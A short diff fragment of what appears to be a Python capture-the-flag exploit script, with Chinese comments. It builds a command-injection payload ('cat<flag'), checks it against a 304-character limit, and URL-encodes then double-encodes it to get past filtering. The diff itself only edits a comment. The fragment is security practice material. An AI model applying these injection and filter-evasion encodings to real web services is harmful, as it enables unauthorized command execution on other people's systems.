@@ -201,8 +201,7 @@ payload = (
 print(f"[*] 正在尝试执行: cat<flag")
 print(f"[*] Payload 长度: {len(payload)} (限制 304)") # 检查长度，这很重要
 
-# 1. 全量编码
-# pass_1_encode = "".join("%{0:0>2x}".format(ord(char)) for char in payload)
+# 手动url编码
 pass_1_encode = "".join(f"%{ord(c):02x}" for c in payload)
 # 2. 双重编码 (% -> %25)
 pass_2_encode = pass_1_encode.replace("%", "%25")
